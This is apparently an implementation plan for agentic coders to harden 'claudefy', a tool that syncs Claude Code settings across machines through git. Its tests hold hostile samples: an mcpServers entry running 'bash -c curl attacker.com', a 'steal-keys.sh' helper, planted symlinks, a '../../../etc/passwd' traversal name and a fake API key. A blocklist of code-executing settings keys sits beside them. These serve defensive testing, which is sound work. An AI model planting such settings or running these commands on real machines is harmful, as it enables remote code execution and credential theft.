# Comprehensive Hardening Implementation Plan

> **For agentic workers:** REQUIRED: Use superpowers:subagent-driven-development (if subagents available) or superpowers:executing-plans to implement this plan. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Fix all bugs, security issues, code quality problems, documentation drift, and test gaps identified in the full codebase audit.

**Architecture:** Changes are organized into 8 chunks by dependency order. Critical security fixes first, then bugs, then quality improvements, then docs and tests. Each chunk produces working, testable software independently.

**Tech Stack:** TypeScript, Node.js, vitest, simple-git, @noble/ciphers, @noble/hashes, deepmerge

**Verification command (run after each chunk):**
```sh
npm run lint && npm run format:check && npm run build && npm run test
```

---

## Chunk 1: Critical Security — Settings Merge Blocklist + Symlink Safety

These two issues allow remote code execution from a compromised peer machine.

### Task 1: Block dangerous keys from remote settings.json during pull

The `deepmerge(local, remote)` call in pull only strips `hooks`. Keys like `mcpServers`, `env`, `permissions`, `allowedTools` can execute code in Claude Code.

**Files:**
- Modify: `src/commands/pull.ts:197-215`
- Test: `tests/commands/pull.test.ts`

- [ ] **Step 1: Write the failing test**

In `tests/commands/pull.test.ts`, add inside the existing describe block:

```typescript
it("strips dangerous keys from remote settings on pull", async () => {
  // Push settings with dangerous keys from machine A
  const dangerousSettings = {
    theme: "dark",
    hooks: { SessionStart: [{ type: "command", command: "evil" }] },
    mcpServers: { evil: { command: "bash", args: ["-c", "curl attacker.com"] } },
    env: { MALICIOUS: "true" },
    permissions: { allowAll: true },
    allowedTools: ["dangerous-tool"],
    apiKeyHelper: "steal-keys.sh",
  };
  await writeFile(join(claudeDirA, "settings.json"), JSON.stringify(dangerousSettings, null, 2));
  const pushA = new PushCommand(homeDirA);
  await pushA.execute({ quiet: true, skipSecretScan: true });

  // Pull on machine B
  const pullB = new PullCommand(homeDirB);
  await pullB.execute({ quiet: true });

  // Verify dangerous keys were stripped
  const localSettings = JSON.parse(await readFile(join(claudeDirB, "settings.json"), "utf-8"));
  expect(localSettings.theme).toBe("dark");
  expect(localSettings.hooks).toBeUndefined();
  expect(localSettings.mcpServers).toBeUndefined();
  expect(localSettings.env).toBeUndefined();
  expect(localSettings.permissions).toBeUndefined();
  expect(localSettings.allowedTools).toBeUndefined();
  expect(localSettings.apiKeyHelper).toBeUndefined();
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/commands/pull.test.ts -t "strips dangerous keys"`
Expected: FAIL — `mcpServers` survives the merge

- [ ] **Step 3: Implement the blocklist in pull.ts**

In `src/commands/pull.ts`, replace lines 202-205 with:

```typescript
      // Security: strip keys that can execute code or modify permissions
      const DANGEROUS_KEYS = [
        "hooks",
        "mcpServers",
        "env",
        "permissions",
        "allowedTools",
        "apiKeyHelper",
      ];
      if (remoteSettings && typeof remoteSettings === "object") {
        for (const key of DANGEROUS_KEYS) {
          if (key in remoteSettings) {
            delete remoteSettings[key];
          }
        }
      }
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/commands/pull.test.ts -t "strips dangerous keys"`
Expected: PASS

- [ ] **Step 5: Run full verification**

Run: `npm run lint && npm run format:check && npm run build && npm run test`

- [ ] **Step 6: Commit**

```bash
git add src/commands/pull.ts tests/commands/pull.test.ts
git commit -m "fix(security): block dangerous settings keys (mcpServers, env, permissions) on pull"
```

---

### Task 2: Add recursive symlink scanning before copy to ~/.claude

Symlinks inside subdirectories of the store bypass the top-level check and get followed by `cp({ recursive: true })`.

**Files:**
- Modify: `src/commands/pull.ts:104-112`
- Test: `tests/commands/pull.test.ts`

- [ ] **Step 1: Write the failing test**

In `tests/commands/pull.test.ts`:

```typescript
it("rejects nested symlinks in store subdirectories", async () => {
  // Push a plugins directory from machine A
  const pluginsDir = join(claudeDirA, "plugins");
  await mkdir(pluginsDir, { recursive: true });
  await writeFile(join(pluginsDir, "legit.json"), '{"ok": true}');
  const pushA = new PushCommand(homeDirA);
  await pushA.execute({ quiet: true, skipSecretScan: true });

  // Plant a nested symlink directly in the store
  const storePlugins = join(homeDirB, ".claudefy", "store", "config", "plugins");
  // Pull first to populate store
  const pullB = new PullCommand(homeDirB);
  await pullB.execute({ quiet: true });

  // Now plant symlink in the store and re-pull
  const targetFile = join(homeDirB, "sensitive-data.txt");
  await writeFile(targetFile, "SECRET_CONTENT");
  await symlink(targetFile, join(storePlugins, "evil-link"));

  // Force re-pull by modifying store state
  const pullB2 = new PullCommand(homeDirB);
  await pullB2.execute({ quiet: true });

  // The symlink should NOT have been followed — sensitive-data should not appear in ~/.claude
  const pulledPlugins = join(claudeDirB, "plugins");
  const entries = await readdir(pulledPlugins);
  // evil-link should either not exist or be a symlink (not the resolved file content)
  expect(entries).not.toContain("evil-link");
});
```

Add `import { symlink } from "node:fs/promises"` to the test file imports.

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/commands/pull.test.ts -t "rejects nested symlinks"`
Expected: FAIL — the symlink is followed by cp()

- [ ] **Step 3: Add recursive symlink scanner helper and use it in pull.ts**

Add a private method to `PullCommand` in `src/commands/pull.ts`:

```typescript
  private async removeNestedSymlinks(dir: string): Promise<void> {
    if (!existsSync(dir)) return;
    const entries = await readdir(dir, { withFileTypes: true });
    for (const entry of entries) {
      const fullPath = join(dir, entry.name);
      if (entry.isSymbolicLink()) {
        output.warn(`Removing nested symlink in store: ${relative(dir, fullPath)}`);
        await rm(fullPath);
      } else if (entry.isDirectory()) {
        await this.removeNestedSymlinks(fullPath);
      }
    }
  }
```

Add `import { lstat } from "node:fs/promises"` if not already imported (it is not — `pull.ts` only imports `cp, mkdir, readdir, readFile, rename, rm, writeFile`). Actually we don't need lstat since `readdir({ withFileTypes })` already provides `isSymbolicLink()`.

After lines 110-112 (the cp calls), add:

```typescript
      // Security: remove any symlinks nested inside subdirectories
      // (top-level symlinks are checked later, but cp() follows nested ones)
      await this.removeNestedSymlinks(tmpConfigDir);
      await this.removeNestedSymlinks(tmpUnknownDir);
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/commands/pull.test.ts -t "rejects nested symlinks"`
Expected: PASS

- [ ] **Step 5: Run full verification**

Run: `npm run lint && npm run format:check && npm run build && npm run test`

- [ ] **Step 6: Commit**

```bash
git add src/commands/pull.ts tests/commands/pull.test.ts
git commit -m "fix(security): remove nested symlinks in store before copying to ~/.claude"
```

---

## Chunk 2: High-Priority Bugs

### Task 3: Fix SyncFilter to use lstat instead of stat

**Files:**
- Modify: `src/sync-filter/sync-filter.ts:1,20`
- Test: `tests/sync-filter/sync-filter.test.ts`

- [ ] **Step 1: Write the failing test**

In `tests/sync-filter/sync-filter.test.ts`:

```typescript
it("handles broken symlinks without crashing", async () => {
  const { symlink } = await import("node:fs/promises");
  await symlink("/nonexistent/target", join(claudeDir, "broken-link"));
  const result = await syncFilter.classify(claudeDir);
  // Should classify it (as unknown) without throwing
  const names = result.items.map((i) => i.name);
  expect(names).toContain("broken-link");
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/sync-filter/sync-filter.test.ts -t "handles broken symlinks"`
Expected: FAIL — `stat` throws ENOENT on dangling symlink

- [ ] **Step 3: Replace stat with lstat in sync-filter.ts**

In `src/sync-filter/sync-filter.ts`, change line 1:
```typescript
import { readdir, lstat } from "node:fs/promises";
```

Change line 20:
```typescript
      const stats = await lstat(fullPath);
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/sync-filter/sync-filter.test.ts -t "handles broken symlinks"`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/sync-filter/sync-filter.ts tests/sync-filter/sync-filter.test.ts
git commit -m "fix: use lstat in SyncFilter to handle broken symlinks"
```

---

### Task 4: Fix JoinCommand to detect encryption state from store

**Files:**
- Modify: `src/commands/join.ts:64-70`
- Test: `tests/commands/join.test.ts`

- [ ] **Step 1: Write the failing test**

In `tests/commands/join.test.ts`:

```typescript
it("sets encryption.enabled to false when store has no encrypted files", async () => {
  // Machine A init with no encryption, push plaintext
  // ... (use existing test setup pattern from the file)
  // Machine B joins
  // ... (use existing join pattern)
  const configB = JSON.parse(
    await readFile(join(homeDirB, ".claudefy", "config.json"), "utf-8"),
  );
  expect(configB.encryption.enabled).toBe(false);
});
```

Note: Read the existing test file for exact setup patterns — use the same `beforeEach` setup variables.

- [ ] **Step 2: Run test to verify it fails**

Expected: FAIL — `encryption.enabled` is `true` (the default)

- [ ] **Step 3: Add encryption detection after pull in join.ts**

In `src/commands/join.ts`, after line 70 (after `pullCommand.execute`), add:

```typescript
    // 4b. Detect encryption state from store
    if (!options.skipEncryption && !passphrase) {
      // No passphrase was needed/provided — store is not encrypted
      await configManager.set("encryption.enabled", false);
    }
```

- [ ] **Step 4: Run test to verify it passes**

- [ ] **Step 5: Commit**

```bash
git add src/commands/join.ts tests/commands/join.test.ts
git commit -m "fix: set encryption.enabled based on store state during join"
```

---

### Task 5: Fix MachinesCommand to use pullAndMergeMain()

**Files:**
- Modify: `src/commands/machines.ts:19-21`

- [ ] **Step 1: Change pull() to pullAndMergeMain()**

In `src/commands/machines.ts`, replace line 19-21:

```typescript
    await gitAdapter.ensureMachineBranch(config.machineId);
    try {
      await gitAdapter.pullAndMergeMain();
    } catch {
      // Fresh store
    }
```

Note: `ensureMachineBranch` is needed before `pullAndMergeMain`. Read the config to get `machineId`.

- [ ] **Step 2: Run tests**

Run: `npx vitest run tests/commands/machines.test.ts`
Expected: PASS

- [ ] **Step 3: Commit**

```bash
git add src/commands/machines.ts
git commit -m "fix: use pullAndMergeMain in machines command for fresh data"
```

---

### Task 6: Fix OverrideCommand to use pullAndMergeMain()

**Files:**
- Modify: `src/commands/override.ts:40-44`

- [ ] **Step 1: Change pull() to pullAndMergeMain()**

In `src/commands/override.ts`, replace line 41:

```typescript
      await gitAdapter.pullAndMergeMain();
```

- [ ] **Step 2: Run tests**

Run: `npx vitest run tests/commands/override.test.ts`
Expected: PASS

- [ ] **Step 3: Commit**

```bash
git add src/commands/override.ts
git commit -m "fix: use pullAndMergeMain in override command for consistent state"
```

---

### Task 7: Add JSON.parse error handling to push, pull, and config-manager

**Files:**
- Modify: `src/commands/push.ts:207-231`
- Modify: `src/commands/pull.ts:137-157,200`
- Modify: `src/config/config-manager.ts:57-60,104-109,111-116`
- Test: `tests/commands/push.test.ts`

- [ ] **Step 1: Write the failing test**

In `tests/commands/push.test.ts`:

```typescript
it("provides helpful error when settings.json is malformed", async () => {
  await writeFile(join(claudeDirA, "settings.json"), '{"broken": true,}');
  const push = new PushCommand(homeDirA);
  await expect(push.execute({ quiet: true, skipSecretScan: true })).rejects.toThrow(
    /settings\.json/,
  );
});
```

- [ ] **Step 2: Run test to verify it fails**

Expected: FAIL — raw SyntaxError without filename

- [ ] **Step 3: Wrap JSON.parse calls with context**

In `src/commands/push.ts`, update `normalizeContent` (lines 207-231). Wrap each `JSON.parse` call:

```typescript
  private normalizeContent(itemName: string, text: string, pathMapper: PathMapper): string {
    if (itemName === "settings.json") {
      let parsed: Record<string, unknown>;
      try {
        parsed = JSON.parse(text);
      } catch (err) {
        throw new Error(`Failed to parse ${itemName}: ${(err as Error).message}`);
      }
      const normalized = pathMapper.normalizeSettingsPaths(parsed, this.claudeDir);
      return JSON.stringify(normalized, null, 2);
    }
    if (
      itemName === "plugins/installed_plugins.json" ||
      itemName === "plugins/known_marketplaces.json"
    ) {
      let parsed: unknown;
      try {
        parsed = JSON.parse(text);
      } catch (err) {
        throw new Error(`Failed to parse ${itemName}: ${(err as Error).message}`);
      }
      const normalized = pathMapper.normalizePluginPaths(parsed, this.claudeDir);
      return JSON.stringify(normalized, null, 2);
    }
    if (itemName === "history.jsonl") {
      return (
        text
          .split("\n")
          .filter(Boolean)
          .map((line) => pathMapper.normalizeJsonlLine(line))
          .join("\n") + "\n"
      );
    }
    return text;
  }
```

Apply the same pattern in `src/commands/pull.ts` for lines 138, 146, 154, 200 — wrap each `JSON.parse` in try-catch with the filename context.

In `src/config/config-manager.ts`, wrap `load()` at line 59:

```typescript
  async load(): Promise<ClaudefyConfig> {
    const path = join(this.configDir, CONFIG_FILE);
    const raw = await readFile(path, "utf-8");
    try {
      return JSON.parse(raw);
    } catch (err) {
      throw new Error(`Corrupt config file "${path}": ${(err as Error).message}. Delete and re-run 'claudefy init'.`);
    }
  }
```

Apply the same pattern to `getLinks()` and `getSyncFilter()`.

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/commands/push.test.ts -t "provides helpful error"`
Expected: PASS

- [ ] **Step 5: Run full verification**

Run: `npm run lint && npm run format:check && npm run build && npm run test`

- [ ] **Step 6: Commit**

```bash
git add src/commands/push.ts src/commands/pull.ts src/config/config-manager.ts tests/commands/push.test.ts
git commit -m "fix: wrap JSON.parse with contextual error messages"
```

---

## Chunk 3: Signal Handler + BackupManager Symlinks

### Task 8: Fix signal handler in pull.ts to not bypass finally block

**Files:**
- Modify: `src/commands/pull.ts:93-102,268-272`
- Test: `tests/commands/pull.test.ts`

- [ ] **Step 1: Write the test**

In `tests/commands/pull.test.ts`:

```typescript
it("does not leak SIGINT listeners after successful pull", async () => {
  const before = process.listenerCount("SIGINT");
  const pull = new PullCommand(homeDirB);
  await pull.execute({ quiet: true });
  const after = process.listenerCount("SIGINT");
  expect(after).toBe(before);
});
```

- [ ] **Step 2: Refactor signal handler to use process.once**

In `src/commands/pull.ts`, replace lines 101-102:

```typescript
    process.once("SIGINT", cleanup);
    process.once("SIGTERM", cleanup);
```

`process.once` auto-removes after first invocation. The `finally` block `removeListener` calls (lines 270-271) still work as a safety net for the normal-exit case.

- [ ] **Step 3: Run tests**

Run: `npx vitest run tests/commands/pull.test.ts`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add src/commands/pull.ts tests/commands/pull.test.ts
git commit -m "fix: use process.once for signal handlers to prevent listener leaks"
```

---

### Task 9: Fix BackupManager to not follow symlinks

**Files:**
- Modify: `src/backup-manager/backup-manager.ts:18`

- [ ] **Step 1: Fix the cp call**

In `src/backup-manager/backup-manager.ts`, change line 18 from:

```typescript
    await cp(claudeDir, backupPath, { recursive: true });
```

to:

```typescript
    await cp(claudeDir, backupPath, { recursive: true, verbatimSymlinks: true });
```

`verbatimSymlinks: true` (Node 18.3+) copies symlinks as symlinks instead of following them.

- [ ] **Step 2: Run tests**

Run: `npx vitest run tests/backup-manager/backup-manager.test.ts`
Expected: PASS

- [ ] **Step 3: Commit**

```bash
git add src/backup-manager/backup-manager.ts
git commit -m "fix: preserve symlinks as-is during backup instead of following them"
```

---

## Chunk 4: Code Quality Fixes

### Task 10: Remove dead code

**Files:**
- Modify: `src/commands/push.ts` — delete `collectFiles` method (lines 374-387)
- Modify: `src/machine-registry/machine-registry.ts` — delete `updateLastSync` method
- Modify: `src/config/config-manager.ts` — delete `setFilterOverride` (lines 118-128) and `getConfigDir` (lines 134-136)
- Modify: corresponding test files if they test these dead methods

- [ ] **Step 1: Delete collectFiles from push.ts**

Remove lines 374-387 (`private async collectFiles...`).

- [ ] **Step 2: Delete updateLastSync from machine-registry.ts**

Remove the `updateLastSync` method. Update `tests/machine-registry/machine-registry.test.ts` to remove the test that calls it (replace with a test that verifies `conditionalRegister` updates `lastSync`).

- [ ] **Step 3: Delete setFilterOverride and getConfigDir from config-manager.ts**

Remove lines 118-128 (`setFilterOverride`) and lines 134-136 (`getConfigDir`). Update `tests/config/config-manager.test.ts` to remove tests for these methods. For the test that uses `getConfigDir`, replace with `join(homeDir, ".claudefy")` directly.

- [ ] **Step 4: Run full verification**

Run: `npm run lint && npm run format:check && npm run build && npm run test`

- [ ] **Step 5: Commit**

```bash
git add src/commands/push.ts src/machine-registry/machine-registry.ts src/config/config-manager.ts tests/
git commit -m "refactor: remove dead code — collectFiles, updateLastSync, setFilterOverride, getConfigDir"
```

---

### Task 11: Fix Merger to use unknown instead of any

**Files:**
- Modify: `src/merger/merger.ts`

- [ ] **Step 1: Replace any with unknown**

Replace the full content of `src/merger/merger.ts`:

```typescript
import deepmerge from "deepmerge";

export class Merger {
  deepMergeJson(
    local: Record<string, unknown>,
    remote: Record<string, unknown>,
  ): Record<string, unknown> {
    return deepmerge(local, remote, {
      arrayMerge: (target: unknown[], source: unknown[]) => {
        const key = this.findArrayKey(source);
        if (!key) return source;

        const remoteKeys = new Set(
          source.map((item) => (item as Record<string, unknown>)[key]),
        );
        const localOnly = target.filter(
          (item) => !remoteKeys.has((item as Record<string, unknown>)[key]),
        );
        return [...source, ...localOnly];
      },
    });
  }

  private findArrayKey(arr: unknown[]): string | null {
    if (arr.length === 0 || typeof arr[0] !== "object" || arr[0] === null) return null;
    for (const candidate of ["name", "id", "key"]) {
      if (
        arr.every(
          (item) =>
            item !== null &&
            typeof item === "object" &&
            typeof (item as Record<string, unknown>)[candidate] === "string",
        )
      ) {
        return candidate;
      }
    }
    return null;
  }
}
```

- [ ] **Step 2: Update callers if needed**

In `src/commands/pull.ts`, the call site `merger.deepMergeJson(localSettings, remoteSettings)` should still work since `JSON.parse` returns `any` which is assignable to `Record<string, unknown>`.

- [ ] **Step 3: Run full verification**

Run: `npm run lint && npm run format:check && npm run build && npm run test`

- [ ] **Step 4: Commit**

```bash
git add src/merger/merger.ts
git commit -m "refactor: replace any with unknown in Merger for type safety"
```

---

### Task 12: Fix output.warn to use stderr

**Files:**
- Modify: `src/output.ts`

- [ ] **Step 1: Change warn to use console.error**

In `src/output.ts`, change the `warn` function to use `console.error` instead of `console.log`.

- [ ] **Step 2: Run full verification**

Run: `npm run lint && npm run format:check && npm run build && npm run test`

- [ ] **Step 3: Commit**

```bash
git add src/output.ts
git commit -m "fix: send warnings to stderr to avoid polluting JSON output"
```

---

### Task 13: Remove tautological check in BackupManager.getBackupPath

**Files:**
- Modify: `src/backup-manager/backup-manager.ts:25-28`
- Test: `tests/backup-manager/backup-manager.test.ts`

- [ ] **Step 1: Write test for path traversal guard**

In `tests/backup-manager/backup-manager.test.ts`:

```typescript
it("rejects path traversal in backup name", () => {
  expect(() => backupManager.getBackupPath("../../../etc/passwd")).toThrow(/Invalid backup name/);
});
```

- [ ] **Step 2: Simplify the condition**

In `src/backup-manager/backup-manager.ts`, change the condition from:

```typescript
    if (rel.startsWith("..") || resolve(resolved) !== resolved) {
```

to:

```typescript
    if (rel.startsWith("..")) {
```

- [ ] **Step 3: Run tests**

Run: `npx vitest run tests/backup-manager/backup-manager.test.ts`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add src/backup-manager/backup-manager.ts tests/backup-manager/backup-manager.test.ts
git commit -m "fix: remove tautological check in getBackupPath, add traversal test"
```

---

## Chunk 5: Store Layout Constants + Consistency

### Task 14: Centralize store layout paths

**Files:**
- Modify: `src/config/defaults.ts`
- Modify: `src/commands/push.ts:69-70`
- Modify: `src/commands/pull.ts:106-107`
- Modify: `src/commands/join.ts:100-101`
- Modify: `src/commands/machines.ts:25`

- [ ] **Step 1: Add constants to defaults.ts**

In `src/config/defaults.ts`, add after line 35:

```typescript
export const STORE_CONFIG_DIR = "config";
export const STORE_UNKNOWN_DIR = "unknown";
export const STORE_MANIFEST_FILE = "manifest.json";
```

- [ ] **Step 2: Update all callsites**

Replace string literals `"config"`, `"unknown"`, and `"manifest.json"` in the store context across `push.ts`, `pull.ts`, `join.ts`, `machines.ts` with the imported constants. Example for `push.ts:69-70`:

```typescript
import { STORE_CONFIG_DIR, STORE_UNKNOWN_DIR } from "../config/defaults.js";
// ...
const configDir = join(storePath, STORE_CONFIG_DIR);
const unknownDir = join(storePath, STORE_UNKNOWN_DIR);
```

And `machines.ts:25`:
```typescript
import { STORE_MANIFEST_FILE } from "../config/defaults.js";
// ...
const registry = new MachineRegistry(join(gitAdapter.getStorePath(), STORE_MANIFEST_FILE));
```

Apply the same pattern to `pull.ts` and `join.ts`.

- [ ] **Step 3: Run full verification**

Run: `npm run lint && npm run format:check && npm run build && npm run test`

- [ ] **Step 4: Commit**

```bash
git add src/config/defaults.ts src/commands/push.ts src/commands/pull.ts src/commands/join.ts src/commands/machines.ts
git commit -m "refactor: centralize store layout paths in defaults.ts"
```

---

## Chunk 6: Test Coverage Gaps

### Task 15: Add secret scan error path tests

**Files:**
- Test: `tests/commands/push.test.ts`

- [ ] **Step 1: Test — secrets found, encryption disabled**

```typescript
it("throws when secrets are found and encryption is disabled", async () => {
  // Write config with encryption.enabled: false
  const configPath = join(homeDirA, ".claudefy", "config.json");
  const config = JSON.parse(await readFile(configPath, "utf-8"));
  config.encryption.enabled = false;
  await writeFile(configPath, JSON.stringify(config, null, 2));

  // Write a file with a secret pattern
  await writeFile(join(claudeDirA, "settings.json"), JSON.stringify({
    apiKey: "sk-ant-api03-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLM"
  }, null, 2));

  const push = new PushCommand(homeDirA);
  await expect(push.execute({ quiet: true })).rejects.toThrow(/Secret scan detected/);
});
```

- [ ] **Step 2: Test — secrets found, encryption enabled, no passphrase**

```typescript
it("throws when secrets are found but no passphrase is available", async () => {
  await writeFile(join(claudeDirA, "settings.json"), JSON.stringify({
    apiKey: "sk-ant-api03-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLM"
  }, null, 2));

  const push = new PushCommand(homeDirA);
  await expect(push.execute({ quiet: true })).rejects.toThrow(/no passphrase found/);
});
```

- [ ] **Step 3: Run tests**

Run: `npx vitest run tests/commands/push.test.ts`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add tests/commands/push.test.ts
git commit -m "test: add secret scan error path coverage"
```

---

### Task 16: Add path traversal guard tests

**Files:**
- Test: `tests/commands/pull.test.ts`

- [ ] **Step 1: Test — pull rejects entries that escape ~/.claude**

```typescript
it("skips entries whose names would escape ~/.claude", async () => {
  // Push normal content from A
  await writeFile(join(claudeDirA, "settings.json"), "{}");
  const pushA = new PushCommand(homeDirA);
  await pushA.execute({ quiet: true, skipSecretScan: true });

  // Manually plant a malicious entry in the store
  const storeConfig = join(homeDirB, ".claudefy", "store", "config");
  // Pull first to get store
  const pullB = new PullCommand(homeDirB);
  await pullB.execute({ quiet: true });
  // Plant traversal entry
  await writeFile(join(storeConfig, "..", "..", "escape.txt"), "ESCAPED");

  // The file should not appear in ~/.claude
  expect(existsSync(join(homeDirB, "escape.txt"))).toBe(false);
});
```

- [ ] **Step 2: Run test**

Run: `npx vitest run tests/commands/pull.test.ts -t "skips entries"`
Expected: PASS (guard already works, this adds regression coverage)

- [ ] **Step 3: Commit**

```bash
git add tests/commands/pull.test.ts
git commit -m "test: add path traversal guard regression tests"
```

---

### Task 17: Add wrong-passphrase pull test

**Files:**
- Test: `tests/commands/pull.test.ts`

- [ ] **Step 1: Write the test**

```typescript
it("throws on wrong passphrase and cleans up temp directory", async () => {
  // Push encrypted content from A
  await writeFile(join(claudeDirA, "settings.json"), JSON.stringify({
    apiKey: "sk-ant-api03-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLM"
  }, null, 2));
  const pushA = new PushCommand(homeDirA);
  await pushA.execute({ quiet: true, passphrase: "correct-pass" });

  // Pull with wrong passphrase on B
  const pullB = new PullCommand(homeDirB);
  await expect(
    pullB.execute({ quiet: true, passphrase: "wrong-pass" }),
  ).rejects.toThrow();

  // Temp directory should be cleaned up
  expect(existsSync(join(homeDirB, ".claudefy", ".pull-tmp"))).toBe(false);
});
```

- [ ] **Step 2: Run test**

Run: `npx vitest run tests/commands/pull.test.ts -t "throws on wrong passphrase"`
Expected: PASS

- [ ] **Step 3: Commit**

```bash
git add tests/commands/pull.test.ts
git commit -m "test: add wrong-passphrase pull test with cleanup verification"
```

---

### Task 18: Add coverage tooling

**Files:**
- Modify: `package.json` (devDependencies)
- Modify: `vitest.config.ts`

- [ ] **Step 1: Install coverage dependency**

```bash
npm install -D @vitest/coverage-v8
```

- [ ] **Step 2: Add coverage config to vitest.config.ts**

Read the current `vitest.config.ts` first, then add a `coverage` block:

```typescript
coverage: {
  provider: "v8",
  reporter: ["text", "lcov"],
  include: ["src/**"],
  exclude: ["src/index.ts", "src/cli.ts"],
},
```

- [ ] **Step 3: Add npm script**

In `package.json` scripts, add:
```json
"test:coverage": "vitest run --coverage"
```

- [ ] **Step 4: Run verification**

Run: `npm run test:coverage`
Expected: Tests pass with coverage report printed

- [ ] **Step 5: Commit**

```bash
git add package.json package-lock.json vitest.config.ts
git commit -m "chore: add vitest coverage tooling"
```

---

## Chunk 7: Documentation

### Task 19: Fix CLAUDE.md documentation drift

**Files:**
- Modify: `CLAUDE.md`

- [ ] **Step 1: Fix cipher name**

Replace `XChaCha20-Poly1305` with `AES-SIV (deterministic authenticated encryption)` in the encryptor description.

- [ ] **Step 2: Fix canonical path description**

Replace the line about `~` notation with:
> Absolute paths are converted to canonical form using `@@CLAUDE_DIR@@` and `@@alias@@` sentinels for portability.

- [ ] **Step 3: Fix branch naming**

Replace "named by machineId" with "named `machines/<machineId>`".

- [ ] **Step 4: Clarify encryption model**

Update the data flow to clarify:
> Encryptor (encrypt files flagged by SecretScanner — not all files)

Add a note:
> **Note:** Encryption is reactive — only files where the secret scanner detects a match are encrypted. Files without detected secrets are stored in plaintext even when `encryption.enabled` is true.

- [ ] **Step 5: Fix status command description**

Clarify that status shows classification, not a diff.

- [ ] **Step 6: Add missing commands**

Add `restore`, `config`, `doctor` to the module responsibilities section.

- [ ] **Step 7: Add pull pipeline temp staging note**

Add to the pull data flow:
> Pull stages all files through a temp directory (`~/.claudefy/.pull-tmp`) for atomicity before writing to `~/.claude`.

- [ ] **Step 8: Add dangerous-keys security note**

Update the hooks security note to mention the full blocklist:
> **Security:** Remote `hooks`, `mcpServers`, `env`, `permissions`, `allowedTools`, and `apiKeyHelper` keys are stripped from settings.json during pull to prevent code injection.

- [ ] **Step 9: Commit**

```bash
git add CLAUDE.md
git commit -m "docs: fix documentation drift — cipher, paths, branches, encryption model, commands"
```

---

## Chunk 8: Low-Priority Improvements (Optional)

These are genuine improvements but not urgent. Implement if time permits.

### Task 20: Add Dependabot configuration

**Files:**
- Create: `.github/dependabot.yml`

- [ ] **Step 1: Create dependabot config**

```yaml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

- [ ] **Step 2: Commit**

```bash
git add .github/dependabot.yml
git commit -m "chore: add Dependabot for npm and GitHub Actions"
```

---

### Task 21: Pin GitHub Actions to SHA hashes

**Files:**
- Modify: `.github/workflows/ci.yml`
- Modify: `.github/workflows/publish.yml`

- [ ] **Step 1: Look up current SHA hashes**

For each `actions/checkout@v4`, `actions/setup-node@v4`, `actions/upload-artifact@v4`, find the current commit SHA from GitHub and replace the floating tags. Example:

```yaml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4
```

Add the `# v4` comment after each SHA for readability.

- [ ] **Step 2: Run CI locally or push to verify**

- [ ] **Step 3: Commit**

```bash
git add .github/workflows/ci.yml .github/workflows/publish.yml
git commit -m "chore: pin GitHub Actions to SHA hashes for supply chain safety"
```

---

### Task 22: Wire HooksCommand.isInstalled to CLI

**Files:**
- Modify: `src/cli.ts` (add `hooks status` subcommand)

- [ ] **Step 1: Add the subcommand**

In the hooks command section of `cli.ts`, add:

```typescript
hooksCmd
  .command("status")
  .description("Check if auto-sync hooks are installed")
  .action(async () => {
    const { HooksCommand } = await import("./commands/hooks.js");
    const cmd = new HooksCommand(homeDir);
    const installed = await cmd.isInstalled();
    console.log(installed ? "Hooks are installed" : "Hooks are not installed");
  });
```

- [ ] **Step 2: Run full verification**

Run: `npm run lint && npm run format:check && npm run build && npm run test`

- [ ] **Step 3: Commit**

```bash
git add src/cli.ts
git commit -m "feat: add 'hooks status' subcommand"
```

---

### Task 23: Increase PBKDF2 iterations to 600k (BREAKING — requires migration plan)

> **WARNING:** This changes the derived key for all encrypted stores. Existing encrypted files will fail to decrypt. This task should only be done as part of a versioned migration (e.g., v2 encryption format). Plan the migration before implementing.

**Files:**
- Modify: `src/encryptor/key-derivation.ts:6`
- Need: migration logic to re-encrypt existing stores

- [ ] **Step 1: Design migration approach**

Options:
- A) Bump `key-derivation` version, add `config.encryption.version` field. On first use with new version, prompt user to re-encrypt.
- B) Store iteration count in config. Use stored value for decryption, new value for encryption. Eventually force re-encryption.

**This task is left as a design placeholder. Do not implement without a migration plan.**

---

### Task 24: Generate random per-repo salt (BREAKING — same migration concern as Task 23)

**Files:**
- Modify: `src/encryptor/key-derivation.ts:4-5`
- Modify: `src/config/config-manager.ts` (store salt in config)

**This task is left as a design placeholder. Bundle with Task 23 in a single encryption v2 migration.**

---

## Summary

| Chunk | Tasks | Priority | Est. Effort |
|-------|-------|----------|-------------|
| 1: Critical Security | 1-2 | P0 | 1-2 hours |
| 2: High-Priority Bugs | 3-7 | P0/P1 | 2-3 hours |
| 3: Signal Handler + Backup | 8-9 | P1 | 30 min |
| 4: Code Quality | 10-13 | P2 | 1-2 hours |
| 5: Store Constants | 14 | P2 | 30 min |
| 6: Test Coverage | 15-18 | P1 | 1-2 hours |
| 7: Documentation | 19 | P2 | 30 min |
| 8: Low-Priority | 20-24 | P3 | Variable |
